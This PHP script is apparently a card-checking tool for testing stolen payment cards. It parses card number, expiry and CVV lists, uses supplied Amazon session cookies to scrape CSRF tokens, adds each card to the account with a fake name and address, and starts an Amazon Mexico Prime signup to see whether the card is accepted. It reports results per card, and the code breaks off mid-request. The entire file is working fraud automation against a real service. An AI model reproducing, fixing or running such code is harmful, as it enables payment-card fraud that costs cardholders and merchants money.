<?php
error_reporting(0); // Mantener en 0 para producción, pero para depurar temporalmente cámbialo a E_ALL

function getstr($string, $start, $end){
    $str = explode($start, $string);
    if (!isset($str[1])) return false; // Añadir verificación para evitar errores si el delimitador no se encuentra
    $str = explode($end, $str[1]);
    return $str[0];
}

function getstr2($string, $start, $end, $line = 1) {
    $str = explode($start, $string);
    if (!isset($str[$line])) return false; // Añadir verificación
    $str = explode($end, $str[$line]);
    return $str[0];
}

function multiexplode($delimiters, $string){
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = str_replace(array(" "), '/', $_POST['lista']);
// $lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@Oxnebor</span><br>');
}

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function gerarLetrasAleatorias($quantidade) {
    $letras = 'abcdefghijklmnopqrstuvwxyz';
    $tamanhoLetras = strlen($letras);
    $resultado = '';

    for ($i = 0; $i < $quantidade; $i++) {
        $indice = rand(0, $tamanhoLetras - 1);
        $resultado .= $letras[$indice];
    }
    return $resultado;
}

$quantidadeLetras = 5; 
$letrasAleatorias = gerarLetrasAleatorias($quantidadeLetras);

$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];

$cookieprim = $_POST['cookies'];

if($cookieprim == null){
    die("Coloque os cookies da amazon.com.mx no formulário de salvar cookies!");    
}

$cookieprim = trim($cookieprim);

function convertCookie($text, $outputFormat = 'BR'){
    $countryCodes = [
        'ES' => ['code' => 'acbes', 'currency' => 'EUR', 'lc' => 'lc-acbes', 'lc_value' => 'es_ES'],
        'MX' => ['code' => 'acbmx', 'currency' => 'MXN', 'lc' => 'lc-acbmx', 'lc_value' => 'es_MX'],
        'IT' => ['code' => 'acbit', 'currency' => 'EUR', 'lc' => 'lc-acbit', 'lc_value' => 'it_IT'],
        'US' => ['code' => 'main', 'currency' => 'USD', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
        'DE' => ['code' => 'acbde', 'currency' => 'EUR', 'lc' => 'lc-main', 'lc_value' => 'de_DE'],
        'BR' => ['code' => 'acbbr', 'currency' => 'BRL', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
        'AE' => ['code' => 'acbae', 'currency' => 'AED', 'lc' => 'lc-acbae', 'lc_value' => 'en_AE'],
        'SG' => ['code' => 'acbsg', 'currency' => 'SGD', 'lc' => 'lc-acbsg', 'lc_value' => 'en_SG'],
        'SA' => ['code' => 'acbsa', 'currency' => 'SAR', 'lc' => 'lc-acbsa', 'lc_value' => 'ar_AE'],
        'CA' => ['code' => 'acbca', 'currency' => 'CAD', 'lc' => 'lc-acbca', 'lc_value' => 'ar_CA'],
        'PL' => ['code' => 'acbpl', 'currency' => 'PLN', 'lc' => 'lc-acbpl', 'lc_value' => 'pl_PL'],
        'AU' => ['code' => 'acbau', 'currency' => 'AUD', 'lc' => 'lc-acbpl', 'lc_value' => 'en_AU'],
        'JP' => ['code' => 'acbjp', 'currency' => 'JPY', 'lc' => 'lc-acbjp', 'lc_value' => 'ja_JP'],
        'FR' => ['code' => 'acbfr', 'currency' => 'EUR', 'lc' => 'lc-acbfr', 'lc_value' => 'fr_FR'],
        'IN' => ['code' => 'acbin', 'currency' => 'INR', 'lc' => 'lc-acbin', 'lc_value' => 'en_IN'],
        'NL' => ['code' => 'acbnl', 'currency' => 'EUR', 'lc' => 'lc-acbnl', 'lc_value' => 'nl_NL'],
        'UK' => ['code' => 'acbuk', 'currency' => 'GBP', 'lc' => 'lc-acbuk', 'lc_value' => 'en_GB'],
        'TR' => ['code' => 'acbtr', 'currency' => 'TRY', 'lc' => 'lc-acbtr', 'lc_value' => 'tr_TR'],
    ];

    if (!array_key_exists($outputFormat, $countryCodes)) {
        return $text;
    }

    $currentCountry = $countryCodes[$outputFormat];

    $text = str_replace(['acbes', 'acbmx', 'acbit', 'acbbr', 'acbae', 'main', 'acbsg', 'acbus', 'acbde'], $currentCountry['code'], $text);
    $text = preg_replace('/(i18n-prefs=)[A-Z]{3}/', '$1' . $currentCountry['currency'], $text);
    $text = preg_replace('/(' . $currentCountry['lc'] . '=)[a-z]{2}_[A-Z]{2}/', '$1' . $currentCountry['lc_value'], $text);
    $text = str_replace('acbuc', $currentCountry['code'], $text);

    return $text;
}

$_com_cookie = convertCookie($cookieprim, 'US');
$tries = 3;

///////////////////////////////////////////////////////////////////////////////////////

$time = time();
$first_name = $letrasAleatorias;
$last_name = $letrasAleatorias;
$fullnamekk = "$first_name $last_name";

///////////////////////////////////////////////////////////////////////////////////////
// INICIO DE LA PRIMERA SOLICITUD CURL ACTUALIZADA
// Esta solicitud intenta obtener el CSRF token y verificar el acceso a la página de pagos.
///////////////////////////////////////////////////////////////////////////////////////

$cookie2 = convertCookie($cookieprim, 'US'); // Asegúrate de que esta cookie sea la correcta para amazon.com

$ch = curl_init(); 

// Nueva URL de la solicitud (proporcionada por ti)
$url_first_request = 'https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo';

// Nuevos encabezados HTTP basados en tu curl proporcionado
$headers_first_request = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: es-ES,es;q=0.9',
    'cache-control: max-age=0',
    'device-memory: 8',
    'downlink: 10',
    'dpr: 1',
    'ect: 4g',
    'priority: u=0, i',
    'referer: https://www.amazon.com/-/es/gp/css/homepage.html?ref_=nav_youraccount_btn',
    'rtt: 50',
    'sec-ch-device-memory: 8',
    'sec-ch-dpr: 1',
    'sec-ch-ua: "Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-ch-ua-platform-version: "10.0.0"',
    'sec-ch-viewport-width: 460',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36', // User-Agent actualizado
    'viewport-width: 460',
];

curl_setopt_array($ch, [
    CURLOPT_URL => $url_first_request,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false, // Mantener false para pruebas, cambiar a true en producción si es posible y tienes el CA bundle
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIE => $cookie2, // Usar la cookie procesada por convertCookie
    CURLOPT_ENCODING => "gzip",
    CURLOPT_HTTPHEADER => $headers_first_request,
    CURLOPT_TIMEOUT => 30, // Puedes ajustar el timeout si es necesario
    CURLOPT_CONNECTTIMEOUT => 10, // Tiempo para establecer la conexión
]);

$r = curl_exec($ch);

// Manejo de errores de CURL para depuración
if (curl_errno($ch)) {
    $error_msg = curl_error($ch);
    curl_close($ch);
    die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Fallo de conexión CURL en la primera solicitud: ' . htmlspecialchars($error_msg) . ' </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');
}

curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////
// FIN DE LA PRIMERA SOLICITUD CURL ACTUALIZADA
///////////////////////////////////////////////////////////////////////////////////////

// La siguiente línea intenta obtener el CSRF token.
// Es MUY probable que el formato del CSRF token haya cambiado en la nueva página.
// Necesitaremos verificar la respuesta ($r) para encontrar el nuevo patrón.
$csrf = getstr($r, 'csrfToken = "','"');

if ($csrf == null) {
    // Si el CSRF token no se encuentra, es un error crítico.
    // Descomenta la siguiente línea para ver la respuesta completa y depurar.
    // echo "Respuesta de Amazon (para depuración): " . htmlspecialchars($r); 
    die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Erro ao obter acesso passkey (CSRF token não encontrado). A estrutura da página pode ter mudado. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');
}

///////////////////////////////////////////////////////////////////////////////////////
// El resto del código sigue igual por ahora.
// Si la primera solicitud funciona, pero las siguientes fallan,
// tendremos que repetir el proceso de inspección para cada una.
///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE => $cookie2,
CURLOPT_ENCODING => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22AddPaymentInstr%22%3A%7B%22cc_CardHolderName%22%3A%22'.$first_name.'+'.$last_name.'%22%2C%22cc_ExpirationMonth%22%3A%22'.intval($mes).'%22%2C%22cc_ExpirationYear%22%3A%22'.$ano.'%22%7D%7D%7D&csrfToken='.urlencode($csrf).'&addCreditCardNumber='.$cc.'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)
]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$cardid_puro = getstr($r, '"paymentInstrumentId":"','"');

if (strpos($r, 'paymentInstrumentId')) {} else{
die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies não detectado, entre em minha conta e depois segurança e insira sua senha para ver se volta a funcionar. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');
}

///////////////////////////////////////////////////////////////////////////////////////

function adicionarEnderecoAmazon($cookie2){
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.amazon.com/a/addresses/add?ref=ya_address_book_add_button',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIE => $cookie2,
  CURLOPT_ENCODING => "gzip",
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_HTTPHEADER => [
    'host: www.amazon.com',
    'referer: https://www.amazon.com/a/addresses?ref_=ya_d_c_addr&claim_type=EmailAddress&new_account=1&',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'viewport-width: 1536'
  ],
]);
$getAddressAmazon = curl_exec($curl);
curl_close($curl);

///////////////////////////////////////////////////////////////////////////////////////

$csrftokenaddress = urlencode(getStr($getAddressAmazon, "type='hidden' name='csrfToken' value='","'"));
$addressfromjwt = getStr($getAddressAmazon, 'type="hidden" name="address-ui-widgets-previous-address-form-state-token" value="','"');
$customeriddkk = getstr($getAddressAmazon, '"customerID":"','"');
$interactionidd = getStr($getAddressAmazon, 'name="address-ui-widgets-address-wizard-interaction-id" value="','"');
$starttimekk = getStr($getAddressAmazon, 'name="address-ui-widgets-form-load-start-time" value="','"');
$requestidd = getStr($getAddressAmazon, '=AddView&hostPageRID=','&' , 1);
$csrftokv2 = urlencode(getStr($getAddressAmazon, 'type="hidden" name="address-ui-widgets-csrfToken" value="','"'));
$randotelefone = rand(1111111,9999999);

///////////////////////////////////////////////////////////////////////////////////////

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.amazon.com/a/addresses/add?ref=ya_address_book_add_post',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIE => $cookie2,
  CURLOPT_ENCODING => "gzip",
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'csrfToken='.$csrftokenaddress.'&addressID=&address-ui-widgets-countryCode=US&address-ui-widgets-enterAddressFullName='.$first_name.'+'.$last_name.'&address-ui-widgets-enterAddressPhoneNumber=313'.$randotelefone.'&address-ui-widgets-enterAddressLine1=Travel+General+Delivery&address-ui-widgets-enterAddressLine2=&address-ui-widgets-enterAddressCity=Montgomery&address-ui-widgets-enterAddressStateOrRegion=AL&address-ui-widgets-enterAddressPostalCode=36104&address-ui-widgets-urbanization=&address-ui-widgets-previous-address-form-state-token='.$addressfromjwt.'&address-ui-widgets-use-as-my-default=true&address-ui-widgets-delivery-instructions-desktop-expander-context=%7B%22deliveryInstructionsDisplayMode%22+%3A+%22CDP_ONLY%22%2C+%22deliveryInstructionsClientName%22+%3A+%22YourAccountAddressBook%22%2C+%22deliveryInstructionsDeviceType%22+%3A+%22desktop%22%2C+%22deliveryInstructionsIsEditAddressFlow%22+%3A+%22false%22%7D&address-ui-widgets-addressFormButtonText=save&address-ui-widgets-addressFormHideHeading=true&address-ui-widgets-heading-string-id=&address-ui-widgets-addressFormHideSubmitButton=false&address-ui-widgets-enableAddressDetails=true&address-ui-widgets-returnLegacyAddressID=false&address-ui-widgets-enableDeliveryInstructions=true&address-ui-widgets-enableAddressWizardInlineSuggestions=true&address-ui-widgets-enableEmailAddress=false&address-ui-widgets-enableAddressTips=true&address-ui-widgets-amazonBusinessGroupId=&address-ui-widgets-clientName=YourAccountAddressBook&address-ui-widgets-enableAddressWizardForm=true&address-ui-widgets-delivery-instructions-data=%7B%22initialCountryCode%22%3A%22US%22%7D&address-ui-widgets-ab-delivery-instructions-data=&address-ui-widgets-address-wizard-interaction-id='.$interactionidd.'&address-ui-widgets-obfuscated-customerId='.$customeriddkk.'&address-ui-widgets-locationData=&address-ui-widgets-enableLatestAddressWizardForm=false&address-ui-widgets-avsSuppressSoftblock=false&address-ui-widgets-avsSuppressSuggestion=false&address-ui-widgets-csrfToken='.$csrftokv2.'&address-ui-widgets-form-load-start-time='.$starttimekk.'&address-ui-widgets-clickstream-related-request-id='.$requestidd.'&address-ui-widgets-locale=',
  CURLOPT_HTTPHEADER => [
    'content-type: application/x-www-form-urlencoded',
    'host: www.amazon.com',
    'origin: https://www.amazon.com',
    'referer: https://www.amazon.com/a/addresses/add?ref=ya_address_book_add_button',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'viewport-width: 1536'
  ],
]);

$addAddressValid = curl_exec($curl);
curl_close($curl);

}

///////////////////////////////////////////////////////////////////////////////////////

function obterEnderecoAmazon($cookie2, $csrf) {
    $ch = curl_init(); 
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://www.amazon.com/hz/mycd/ajax',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_COOKIE => $cookie2,
        CURLOPT_ENCODING => "gzip",
        CURLOPT_POSTFIELDS => 'data=%7B%22param%22%3A%7B%22LogPageInfo%22%3A%7B%22pageInfo%22%3A%7B%22subPageType%22%3A%22kinw_total_myk_stb_Perr_paymnt_dlg_cl%22%7D%7D%2C%22GetAllAddresses%22%3A%7B%7D%7D%7D&csrfToken=' . urlencode($csrf),
        CURLOPT_HTTPHEADER => array(
            'Host: www.amazon.com',
            'Accept: application/json, text/plain, */*',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
            'client: MYXSettings',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://www.amazon.com',
            'X-Requested-With: com.amazon.dee.app',
            'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
            'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        )
    ]);
    $r = curl_exec($ch);
    curl_close($ch);
    
    return getStr($r, 'AddressId":"','"');
}

///////////////////////////////////////////////////////////////////////////////////////

$addresid = obterEnderecoAmazon($cookie2, $csrf);

if (empty($addresid)) {

    adicionarEnderecoAmazon($cookie2);
    sleep(2);
    $addresid = obterEnderecoAmazon($cookie2, $csrf);

    if (empty($addresid)) {
        die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Um endereço foi cadastrado, confira em sua conta e tente novamente. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');
    }
}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22SetOneClickPayment%22%3A%7B%22paymentInstrumentId%22%3A%22'.$cardid_puro.'%22%2C%22billingAddressId%22%3A%22'.$addresid.'%22%2C%22isBankAccount%22%3Afalse%7D%7D%7D&csrfToken='.urlencode($csrf).'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);

if(strpos($r, '"success":true,"paymentInstrumentId":"')) {} else {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Erro ao adicionar cartão de crédito. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_mshop_mpo',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'X-Requested-With: com.amazon.mShop.android.shopping',
'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$market = getstr($r, "ue_mid = '","'");
$wigstst = getStr($r, 'testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"','"');
$customerId = getStr($r, 'customerId":"','"');
$widgetInstanceId = getStr($r, 'widgetInstanceId":"','"');
$session_id   = getstr($r, '"sessionId":"', '"');

if ($wigstst == null) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Erro ao acessar AmazonWallet. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/payments-portal/data/widgets2/v1/customer/'.$customerId.'/continueWidget',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'ppw-jsEnabled=true&ppw-widgetState='.$wigstst.'&ppw-widgetEvent=ViewPaymentMethodDetailsEvent&ppw-instrumentId='.$cardid_puro.'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/plain, */*',
'X-Requested-With: XMLHttpRequest',
'Widget-Ajax-Attempt-Count: 0',
'APX-Widget-Info: YA:Wallet/mobile/'.$widgetInstanceId.'',
'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://www.amazon.com',
'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_mshop_mpo',
'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',

)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$payment = getStr($r, '"paymentMethodId\":\"','\"');
$cookie2 = convertCookie($cookieprim, 'MX');

if ($payment == null) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Erro ao obter cartão vinculado. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$cookieUS1 = 'amazon.com.mx';

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL            => "https://".$cookieUS1."/gp/prime/pipeline/membersignup",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
// CURLOPT_POSTFIELDS     => "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1",
CURLOPT_POSTFIELDS     => "clientId=DiscoveryBar&ingressId=JoinPrimePill&ref=join_prime_cta_discobar&primeCampaignId=DiscoveryBar_JoinPrimePill_ATVHome&redirectURL=&inline=1&disableCSM=1",
CURLOPT_HTTPHEADER => array(
"Host: $cookieUS1",
"content-type: application/x-www-form-urlencoded",
),
]);
$result = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$wid9090 = getstr($result, 'name=&amp;quot;ppw-widgetState&amp;quot; value=&amp;quot;','&amp;quot;');
$sessionds = getstr($result, 'Subs:Prime&amp;quot;,&amp;quot;session&amp;quot;:&amp;quot;','&amp;quot');
$customerID = getstr($result, 'quot;customerId&amp;quot;:&amp;quot;','&amp;quot');
$noovotoken = getstr($result, 'quot;selectedInstrumentIds&amp;quot;:[&amp;quot;','&amp');
$ohtoken1 = getstr($result, 'quot;selectedInstrumentIds&amp;quot;:[&amp;quot;','&amp');
$ohtoken2 = getstr($result, 'Subs:Prime&amp;quot;,&amp;quot;serializedState&amp;quot;:&amp;quot;','&amp;quot;');

if ($ohtoken2 == null) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Falha em assinatura AmazonPrime. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$brurloa92 = 'https://www.'.$cookieUS1.'/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $brurloa92);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIE, $cookie2);
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3AShowPreferencePaymentOptionListEvent%3A%7B%22instrumentId%22%3A%5B%22".$cardid_puro."%22%5D%2C%22instrumentIds%22%3A%5B%22".$cardid_puro."%22%5D%7D=change&ppw-jsEnabled=true&ppw-widgetState=".$ohtoken2."&ie=UTF-8");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Apx-Widget-Info: Subs:Prime/desktop/LFqEJMZmYdCd';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://www.'.$cookieUS1.'';
$headers[] = 'Referer: https://www.'.$cookieUS1.'/gp/prime/pipeline/confirm';
$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$ohtoken3 = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');
$ohtoken4 = getstr($result, 'data-instrument-id=\"','\"');

if ($ohtoken3 == null) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Erro ao gerar transação com cartão. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.'.$cookieUS1.'/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=&ppw-jsEnabled=true&ppw-widgetState=".$ohtoken3."&ie=UTF-8&ppw-".$token4."_instrumentOrderTotalBalance=%7B%7D&ppw-instrumentRowSelection=instrumentId%3D".$cardid_puro."%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-".$cardid_puro."_instrumentOrderTotalBalance=%7B%7D");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Apx-Widget-Info: Subs:Prime/desktop/r9R8zQ8Dgh1b';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://'.$cookieUS1.'';
$headers[] = 'Referer: https://www.'.$cookieUS1.'/gp/prime/pipeline/membersignup';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$walletid2 = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');

if ($walletid2 == null) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Falha ao obter walletid2. </span> ➔ Tempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@Oxnebor</span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL            => "https://www.$cookieUS1/payments-portal/data/widgets2/v1/customer/".$customerID."/continueWidget",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
